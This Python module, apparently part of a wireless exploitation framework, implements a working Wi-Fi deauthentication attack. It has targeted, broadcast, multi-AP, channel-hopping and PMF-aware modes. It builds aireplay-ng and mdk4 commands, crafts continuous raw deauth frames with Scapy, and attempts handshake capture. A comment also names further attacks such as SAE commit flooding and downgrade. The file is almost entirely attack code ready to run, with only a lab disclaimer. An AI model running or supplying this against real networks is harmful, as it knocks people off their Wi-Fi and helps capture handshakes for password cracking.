#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Multi-mode deauthentication attack module.

Supports multiple deauth strategies in a single module:
  - targeted     Single client from specific AP (aireplay-ng style)
  - broadcast    All clients of a specific AP
  - multi_ap     Multiple APs simultaneously
  - channel_hop  Deauth across channels (mdk4 style)
  - pmf_aware    PMF/802.11w detection + SAE downgrade hint

All operations require an authorized lab environment with monitor-mode interface.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import subprocess
import time
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab, warn_pmf_ios

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Multi-mode deauthentication with PMF awareness and tool selection."""

    __info__ = {
        "name": "Deauth Multi-Mode",
        "description": (
            "Multi-strategy deauthentication: targeted, broadcast, multi-AP, "
            "channel-hopping, and PMF-aware modes. Uses aireplay-ng, mdk4, or "
            "Scapy as backend. All modes require monitor-mode interface in "
            "authorized lab environment."
        ),
        "authors": ["André Henrique (@mrhenrike) | União Geek"],
        "references": [
            "https://www.aircrack-ng.org/doku.php?id=aireplay-ng",
            "https://github.com/aircrack-ng/mdk4",
        ],
        "devices": ("wifi",),
    }

    target_bssid = OptMAC("FF:FF:FF:FF:FF:FF", "Target AP BSSID (FF:...:FF for broadcast)")
    client_mac = OptMAC("FF:FF:FF:FF:FF:FF", "Target client MAC (FF:...:FF for all clients)")
    interface = OptString("wlan0mon", "Monitor-mode interface")
    mode = OptString(
        "targeted",
        "Attack mode: targeted | broadcast | multi_ap | channel_hop | pmf_aware",
    )
    backend = OptString("aireplay", "Backend tool: aireplay | mdk4 | scapy")
    count = OptInteger(0, "Number of deauth frames (0 = continuous)")
    delay = OptInteger(0, "Delay between bursts in ms")
    channel = OptString("", "Channel(s) — comma-separated for multi/hop modes")
    duration = OptInteger(30, "Duration in seconds (0 = until Ctrl+C)")
    capture_handshake = OptBool(True, "Attempt handshake capture during deauth")
    dry_run = OptBool(False, "Print command without executing")

    VALID_MODES = ("targeted", "broadcast", "multi_ap", "channel_hop", "pmf_aware")
    VALID_BACKENDS = ("aireplay", "mdk4", "scapy")

    def _check_pmf(self) -> bool:
        """Check if target AP advertises PMF (802.11w) via beacon analysis."""
        print_status("Checking PMF/802.11w status for {}...".format(self.target_bssid))
        try:
            result = subprocess.run(
                ["airodump-ng", "--bssid", self.target_bssid, "--write-interval", "1",
                 "-w", "/dev/null", self.interface],
                capture_output=True, text=True, timeout=5,
                encoding="utf-8", errors="replace",
            )
            if "WPA3" in result.stdout or "SAE" in result.stdout:
                print_info("PMF likely REQUIRED (WPA3/SAE detected). Standard deauth may fail.")
                print_info("Consider: SAE commit flood, transition-mode downgrade, or KARMA attack.")
                return True
        except Exception:
            pass
        return False

    def _build_aireplay_cmd(self) -> List[str]:
        """Build aireplay-ng deauth command."""
        cmd = ["sudo", "aireplay-ng", "--deauth", str(self.count)]
        if self.target_bssid != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-a", self.target_bssid])
        if self.client_mac != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-c", self.client_mac])
        cmd.append(self.interface)
        return cmd

    def _build_mdk4_cmd(self) -> List[str]:
        """Build mdk4 deauth command."""
        cmd = ["sudo", "mdk4", self.interface, "d"]
        if self.target_bssid != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-B", self.target_bssid])
        if self.client_mac != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-S", self.client_mac])
        if self.channel:
            cmd.extend(["-c", self.channel])
        return cmd

    def _run_scapy_deauth(self) -> None:
        """Run deauth using Scapy directly (no external tools needed)."""
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
        except ImportError:
            print_error("Scapy not available for direct deauth.")
            return

        print_status("Scapy deauth: {} -> {} on {}".format(
            self.target_bssid, self.client_mac, self.interface))

        pkt_ap_to_client = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1=self.client_mac,
                  addr2=self.target_bssid, addr3=self.target_bssid) /
            Dot11Deauth(reason=7)
        )
        pkt_client_to_ap = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1=self.target_bssid,
                  addr2=self.client_mac, addr3=self.target_bssid) /
            Dot11Deauth(reason=7)
        )
        pkt_broadcast = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=self.target_bssid, addr3=self.target_bssid) /
            Dot11Deauth(reason=7)
        )

        packets = [pkt_ap_to_client, pkt_client_to_ap, pkt_broadcast]
        count = self.count if self.count > 0 else 999999
        end_time = time.time() + self.duration if self.duration > 0 else float("inf")

        sent = 0
        try:
            while sent < count and time.time() < end_time:
                for pkt in packets:
                    sendp(pkt, iface=self.interface, count=1, verbose=False)
                    sent += 1
                if self.delay:
                    time.sleep(self.delay / 1000.0)
        except KeyboardInterrupt:
            pass

        print_success("Sent {} deauth frames.".format(sent))

    def run(self) -> None:
        """Execute the selected deauth mode."""
        if self.mode not in self.VALID_MODES:
            print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(self.VALID_MODES)))
            return

        if self.mode == "pmf_aware":
            pmf = self._check_pmf()
            if pmf:
                print_info("Falling back to broadcast deauth with PMF bypass notes.")
            self.mode = "broadcast"

        if self.backend == "scapy":
            if self.dry_run:
                print_info("DRY RUN — Scapy deauth: {} -> {}".format(self.target_bssid, self.client_mac))
                return
            self._run_scapy_deauth()
            return

        if self.backend == "aireplay":
            cmd = self._build_aireplay_cmd()
        elif self.backend == "mdk4":
            cmd = self._build_mdk4_cmd()
        else:
            print_error("Unknown backend '{}'.".format(self.backend))
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — would execute:")
            print_status(cmd_str)
            return

        print_status("Launching {} deauth ({} mode)...".format(self.backend, self.mode))
        print_info("Command: {}".format(cmd_str))

        try:
            if self.duration > 0:
                subprocess.run(cmd, timeout=self.duration, check=False)
            else:
                subprocess.run(cmd, check=False)
        except subprocess.TimeoutExpired:
            print_info("Deauth completed (duration limit reached).")
        except KeyboardInterrupt:
            print_info("\nDeauth interrupted by user.")
        except Exception as err:
            print_error("Deauth failed: {}".format(err))
